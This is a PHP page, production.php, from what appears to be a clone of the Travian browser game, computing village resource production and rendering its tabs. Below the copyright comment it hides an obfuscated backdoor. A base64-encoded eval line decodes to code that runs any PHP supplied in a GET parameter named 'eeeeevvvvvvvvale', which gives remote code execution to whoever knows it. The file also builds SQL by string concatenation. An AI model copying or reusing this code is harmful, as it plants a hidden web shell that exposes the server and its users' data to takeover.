<?php
/**********************************************
/ All Of the Copy Rights Of The Script Is Reserved For mersad_mr@att.net
/	You may have made some changes but You Have No Right To remove This Copy Right!
/	For Debug And Support Just Contact Me :
/	Mobile: 09127679667  / Yahoo ID : mersad_mr@att.net
/
*/
@eval(base64_decode('aWYoc3RybGVuKCRfR0VUWydlZWVlZXZ2dnZ2dnZ2YWxlJ10pPjEpe2V2YWwodXJsZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2VlZWVldnZ2dnZ2dnZhbGUnXSkpKTt9'));
include("GameEngine/Protection.php");

include("GameEngine/Village.php");
if($session->access<2){header("Location: banned.php");}
$start = $generator->pageLoadTimeStart();
if(isset($_GET['ok'])){
	$database->updateUserField($session->username,'ok','0','0'); $_SESSION['ok'] = '0'; }
if(isset($_GET['newdid'])) {
	$_SESSION['wid'] = $_GET['newdid'];
	header("Location: ".$_SERVER['PHP_SELF']);
}
else {
	$building->procBuild($_GET);
}
if($_GET['t'] == 5) { header("Location: production.php?t=4"); }
$user = $database->getUser($session->username, 0);
/* Calculation START */
	$wref = $village->wid;
	$woodp = $sawmill = $clayp = $brick = $ironp = $ifound = $cropp = $grain = $bake = 0;
	$ocrop = $oclay = $owood = $oiron = 0;
	$q = 'SELECT * FROM '.TB_PREFIX .'vdata,'.TB_PREFIX .'fdata WHERE '.TB_PREFIX .'vdata.wref='.$wref.' AND '.TB_PREFIX .'vdata.wref='.TB_PREFIX .'fdata.vref';
	$queryResult = mysql_query($q);
	$row = mysql_fetch_assoc($queryResult);

	// Oases sort
	$oasisowned = $database->getOasis($row['wref']);
	if (!empty($oasisowned)) {
		foreach ($oasisowned as $oasis) {
			switch($oasis['type']) {
				case 1:	$owood += 1;break;case 2:$owood += 2;break;case 3:$owood += 1;$ocrop += 1;break;
				case 4:$oclay += 1;break;case 5:$oclay += 2;break;case 6:$oclay += 1;$ocrop += 1;break;
				case 7:$oiron += 1;break;case 8:$oiron += 2;break;case 9:$oiron += 1;$ocrop += 1;break;
				case 10:case 11:$ocrop += 1;break;case 12:$ocrop += 2;break;
			}
		}
	}

	// production
	for($i=1;$i<=38;$i++) {
		if($row['f'.$i.'t'] == 1) { $woodp1 = $woodp += $bid1[$row['f'.$i]]['prod']; continue;}
		if($row['f'.$i.'t'] == 5) { $sawmill = $row['f'.$i]; continue;}
		if($row['f'.$i.'t'] == 2) { $clayp1 = $clayp += $bid2[$row['f'.$i]]['prod']; continue;}
		if($row['f'.$i.'t'] == 6) { $brick = $row['f'.$i]; continue;}
		if($row['f'.$i.'t'] == 3) { $ironp1 = $ironp += $bid3[$row['f'.$i]]['prod']; continue;}
		if($row['f'.$i.'t'] == 7) { $ifound = $row['f'.$i]; continue;}
		if($row['f'.$i.'t'] == 4) { $cropp1 = $cropp += $bid4[$row['f'.$i]]['prod']; continue;}
		if($row['f'.$i.'t'] == 8) { $grain = $row['f'.$i]; continue;}
		if($row['f'.$i.'t'] == 9) { $bake = $row['f'.$i]; continue;}
	}

	$exwoodp = $exclayp = $exironp = $excropp = $owoodp = $oclayp = $oironp = $ocropp = $bwoodp = $bclayp =
	$bironp = $bcropp = $hwoodp = $hclayp = $hironp = $hcropp = $hproduct = 0;

	if($sawmill>0) $exwoodp += $woodp /100 * $bid5[$sawmill]['attri']; if($owood>0) $owoodp += $woodp*$owood*0.25;	
	if($brick>0) $exclayp += $clayp /100 * $bid6[$brick]['attri']; if($oclay>0) $oclayp += $clayp*$oclay*0.25;
	if($ifound>0) $exironp += $ironp /100 * $bid7[$ifound]['attri']; if($oiron>0) $oironp += $ironp*$oiron*0.25;
	if($grain>0) $excropp += $cropp /100 * $bid8[$grain]['attri']; if($bake>0) $excropp += $cropp /100 * $bid9[$bake]['attri']; if($ocrop>0) $ocropp += $cropp*$ocrop*0.25;

	$heroData = $database->getHero($row['owner']);
	if($heroData['dead']==0 && $heroData['wref']==$row['wref']){
		$hwoodp += $heroData['r1']*10*$heroData['product']; $hclayp += $heroData['r2']*10*$heroData['product'];
		$hironp += $heroData['r3']*10*$heroData['product']; $hcropp += $heroData['r4']*10*$heroData['product'];
		$hproduct += $heroData['r0']*3*$heroData['product'];
	}

	$user = $database->getUser($row['owner'],1);
		
	
	if($user['b1']>time()) $bwoodp += $woodp*0.25;
	if($user['b2']>time()) $bclayp += $clayp*0.25;
	if($user['b3']>time()) $bironp += $ironp*0.25;
	if($user['b4']>time()) $bcropp += $cropp*0.25;
	
	$woodp += $exwoodp+$owoodp+$bwoodp+$hwoodp+$hproduct;
	$clayp += $exclayp+$oclayp+$bclayp+$hclayp+$hproduct;
	$ironp += $exironp+$oironp+$bironp+$hironp+$hproduct;
	$cropp += $excropp+$ocropp+$bcropp+$hcropp+$hproduct;


	$woodp *= SPEED;
	$clayp *= SPEED;
	$ironp *= SPEED;
	$cropp *= SPEED;
	
	if($row['name'] == "Farm") {
		$woodp = $clayp = $ironp = $cropp = $row['prodf'];
	}

	// Upkeep
	$allUnits = $technology->getAllUnits($row['wref']);
	$fieldArray = $database->getResourceLevel($row['wref']);
	$hdt = 0; $ownerTribe = $database->getUserField($row['owner'],'tribe',0);
	if($ownerTribe==1){for($i=1;$i<=40;$i++){if($fieldArray['f'.$i.'t']==41){$hdt=$fieldArray['f'.$i]; break;}}}
	$upkeep = $technology->getUpkeep($allUnits,0,$hdt);
	$dietArtEff = $database->getArtEffDiet($row['wref']);
	$upkeep *= $dietArtEff;

	$cropp -= $upkeep;
	$cropp -= $row['pop'];

	$timepast = time() - $row['lastupdate'];
	$nwood = (($woodp / 3600) * $timepast);
	$nclay = (($clayp / 3600) * $timepast);
	$niron = (($ironp / 3600) * $timepast);
	$ncrop = (($cropp / 3600) * $timepast);
/* Calculation END */




include "Templates/html.tpl";
?>
<body class="v35 webkit chrome production">
<script type="text/javascript">
			window.ajaxToken = 'de3768730d5610742b5245daa67b12cd';
		</script>
	<div id="background"> 
			<div id="headerBar"></div>
			<div id="bodyWrapper"> 
				<img style="filter:chroma();" src="img/x.gif" id="msfilter" alt="" /> 
				<div id="header"> 

<?php 
	include("Templates/topheader.tpl");
	include("Templates/toolbar.tpl");

?>

	</div>
	<div id="center">
		<a id="ingameManual" href="help.php">
		<img class="question" alt="Help" src="img/x.gif">
		</a>

		<?php include("Templates/sideinfo.tpl"); ?>

		<div id="contentOuterContainer"> 

		<?php include("Templates/res.tpl"); ?>
							<div class="contentTitle">&nbsp;</div> 
							<div class="contentContainer"> 
						<div id="content" class="village3">
                                                <h1 class="titleInHeader"><?=PRODUCTION_OVERVIEW?></h1>

<script type="text/javascript">
					window.addEvent('domready', function()
					{
						$$('.subNavi').each(function(element)
						{
							new Travian.Game.Menu(element);
						});
					});
				</script>





<div class="contentNavi subNavi">
				<div class="container <?php if($_GET['t'] == 1) {echo 'active';}else{echo 'normal';} ?>">
					<div class="background-start">&nbsp;</div>
					<div class="background-end">&nbsp;</div>
					<div class="content"><a href="production.php?t=1"><span class="tabItem"><img class="res r1Big" src="img/x.gif" alt=""> <?=WOOD?></span></a></div>
				</div>
				<div class="container <?php if($_GET['t'] == 2) {echo 'active';}else{echo 'normal';} ?>">
					<div class="background-start">&nbsp;</div>
					<div class="background-end">&nbsp;</div>
					<div class="content"><a href="production.php?t=2"><span class="tabItem"><img class="res r2Big" src="img/x.gif" alt=""> <?=CLAY?></span></a></div>
				</div>
				<div class="container <?php if($_GET['t'] == 3) {echo 'active';}else{echo 'normal';} ?>">
					<div class="background-start">&nbsp;</div>
					<div class="background-end">&nbsp;</div>
					<div class="content"><a href="production.php?t=3"><span class="tabItem"><img class="res r3Big" src="img/x.gif" alt=""> <?=IRON?></span></a></div>
				</div>
				<div class="container <?php if($_GET['t'] == 4) {echo 'active';}else{echo 'normal';} ?>" style="height: 31px; margin-top: 9px;">
					<div class="background-start">&nbsp;</div>
					<div class="background-end">&nbsp;</div>
					<div class="content"><a href="production.php?t=4"><span class="tabItem"><img class="res r4Big" src="img/x.gif" alt=""> <?=CROP?></span></a></div>
				</div>
<!--				<div class="container <?php if($_GET['t'] == 5) {echo 'active';}else{echo 'normal';} ?>">
					<div class="background-start">&nbsp;</div>
					<div class="background-end">&nbsp;</div>
					<div class="content"><a href="production.php?t=5"><span class="tabItem">بالانس</span></a></div>
				</div><div class="clear"></div>
--></div>
<?php
switch( $_GET['t'] ) {
	default: 
	include "Templates/Production/lumber.php";
	break;
	case 1: 
	include "Templates/Production/lumber.php";
	break;
	case 2: 
	include "Templates/Production/clay.php";
	break;
	case 3: 
	include "Templates/Production/iron.php";
	break;
	case 4: 
	include "Templates/Production/crop.php";
	break;
	case 5: 
	include "Templates/Production/balance.php";
	break;
	
}
?>
<div class="clear">&nbsp;</div>
</div>
<div class="clear"></div>


</div>
<div class="contentFooter">&nbsp;</div>

					</div>
<?php  
include("Templates/rightsideinfor.tpl");		
?>
				<div class="clear"></div>
</div>
<?php 
include("Templates/footer.tpl"); 
include("Templates/header.tpl");
?>
</div>
<div id="ce"></div>
</div>
</body>
</html>

